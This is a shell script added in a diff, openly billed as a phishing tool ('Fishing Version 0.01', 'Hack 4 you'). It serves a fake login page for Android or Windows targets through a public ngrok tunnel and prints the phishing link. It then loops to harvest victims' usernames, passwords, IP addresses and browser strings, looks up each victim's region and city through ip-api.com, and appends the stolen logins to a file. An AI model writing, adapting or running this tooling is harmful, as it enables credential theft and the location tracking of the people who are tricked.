@@ -1,0 +1,205 @@
+#!/usr/bin/env sh
+bi='\033[34;1m' #biru
+ij='\033[32;1m' #ijo
+pr='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+or='\033[1;38;5;208m' #Orange
+#batas
+load(){
+#batas
+sleep 2
+clear
+echo "$me[$ij+$me]CheckingTools"
+echo 
+which php > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo "$ku[$ij ✔ $ku] $or php.............$bi[$pu found $bi]"
+which php > /dev/null 2>&1
+sleep 2
+else
+echo  "$me[$pu X $me] $ku php  -> $me not found "
+echo  "[ ! ] Installing Php "
+sudo apt-get install php -y
+echo  "[ ✔ ] Done installing ...."
+which php > /dev/null 2>&1
+sleep 2
+fi
+#batas
+which unzip > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo "$ku[$ij ✔ $ku] $or unzip...........$bi[$pu found $bi]"
+which unzip > /dev/null 2>&1
+sleep 2
+else
+echo  "$me[$pu X $me] $ku php  -> $me not found "
+echo  "[ ! ] Installing Unzip"
+sudo apt-get install unzip -y
+echo  "[ ✔ ] Done installing ...."
+which unzip > /dev/null 2>&1
+sleep 2
+fi
+#batas
+
+which wget > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo "$ku[$ij ✔ $ku] $or wget............$bi[$pu found $bi]"
+which wget> /dev/null 2>&1
+sleep 2
+else
+echo  "$me[$pu X $me] $ku php  -> $me not found "
+echo  "[ ! ] Installing wget "
+sudo apt-get install wget -y
+echo  "[ ✔ ] Done installing ...."
+which wget > /dev/null 2>&1
+sleep 2
+fi
+#batas
+which ngrok > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo "$ku[$ij ✔ $ku] $or Ngrok...........$bi[$pu found $bi]"
+which ngrok > /dev/null 2>&1
+sleep 2
+else
+echo  "$me[$pu X $me] $ku Ngrok  -> $me not found "
+echo  "[ ! ] Installing Ngrok"
+curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok   > /dev/null 2>&1
+chmod 777 ngrok
+echo  "[ ✔ ] Done installing ...."
+which ngrok> /dev/null 2>&1
+sleep 2
+fi
+sleep 0.05
+clear
+sleep 0.05
+}
+banner(){
+echo """$bi
+                     ______________                                      
+                    ___________________                                  
+                   _____ _________________                               
+                _____________________________                            
+            ________ _____  ________________ ___                         
+        ________________________ _________________                _______
+      _______________________________ ______________          _____  ____
+    __ _______                  ___________________       ______  _______
+  ____ ________                      ____________________________________
+ _______________                        __________________________   ____
+________________                            _____________________________
+  ______________                              ____________________ ______
+ _______________                              ____________________ ______
+  _____________                           _________     __________    ___
+     ________                         __________          ______ ________
+         __   __                 __________________          ____  ______
+              _____________________________________               _______
+                ____________     ________________                        
+                ______            _____________                          
+                 ______              _______                             
+                  ____                 __                                
+                   __ 
+"""
+echo "$bi [$ku + $bi]═══════[ $me Author : @HedyFake $ku _-\|/-_ $me Twiter:@iAmHere96509064 $bi ]═══════[$ku + $bi]"
+echo 
+echo "$ij"
+echo "╔──────────────────────────────────────────────╗"
+echo "|              $pu Fishing Version 0.01 $ij          |"
+echo "|              $pu Hack 4 you $ij                    |"
+echo "┖──────────────────────────────────────────────┙"
+sleep 0.05
+echo
+}
+ip(){
+  echo "$or[$pu+$or] Waiting for target..!"
+  while [ true ]; do
+
+  if [ -e 'web/log.txt' ]; then
+  echo "$me[$pu+$me] Target Opened..!"
+  echo
+  cat web/ip.txt >> web/server.txt
+  ip=$(grep 'IP' web/ip.txt | awk '{print $2}')
+  usr=$(grep 'Browser:' web/ip.txt | cut -d '"' -f2)
+  curl -s -L "http://ip-api.com/json/"$ip 
+  prov=$(curl -s -N http://ip-api.com/json/$ip | jq -r ".regionName")
+  kota=$(curl -s -N http://ip-api.com/json/$ip | jq -r '.city')
+  echo "$ij[$pu+$ij] Ip:$pu" $ip 
+  echo "$ij[$pu+$ij] $pu"$usr
+
+  echo
+  name=$(cat web/log.txt | grep 'Username' | awk '{print $2}')
+  pass=$(cat web/log.txt | grep 'Username' | awk '{print $4}')
+  echo "$ij[$pu+$ij] Username :" $name
+  echo "$ij[$pu+$ij] Password :" $pass
+  cat web/log.txt >> web/pass.txt
+  rm -rf web/log.txt
+  fi
+  done
+  
+
+}
+ngrok(){
+  echo "$bi[$pu+$bi] Start php server...!!"
+  php -t "web/" -S 0.0.0.0:3333 > /dev/null 2>&1 &
+  sleep 1
+  echo "$bi[$pu+$bi] Start ngrok server...!!"
+  ngrok http 3333 > /dev/null 2>&1 &
+  sleep 3
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+  echo 
+  echo "$cy[$pu+$cy] Link phising:$pu" $link
+  sleep 3
+}
+module(){
+  rm -rf web/index.php
+  cat web/login.html  >> web/index.php
+  cat web/ip.php >> web/index.php
+}
+
+moduleadb(){
+  rm -rf web/index.php
+  cat web/loginadb.html >> web/index.php
+  cat web/ip.php >> web/index.php 
+}
+
+pill(){
+  echo 
+  echo "$me[$or!$me]$pu Pillih perangkat.!"
+  echo
+  echo "$bi[$pu 1 $bi]$pu Android"
+  echo 
+  echo "$bi[$pu 2 $bi]$pu Windows"
+  echo
+  read -p "root@phising-->#" pil
+
+  if [ $pil -eq  "1" ];then
+  android
+  moduleadb
+  ngrok
+  ip
+  fi 
+  #batas
+  if [ $pil -eq "2" ];then
+  windows
+  module
+  ngrok
+  ip
+  fi
+  
+  
+}
+android(){
+  moduleadb
+  ngrok
+  ip
+}
+
+windows(){
+  module
+  ngrok
+  ip
+}
+
+load
+banner
+pill
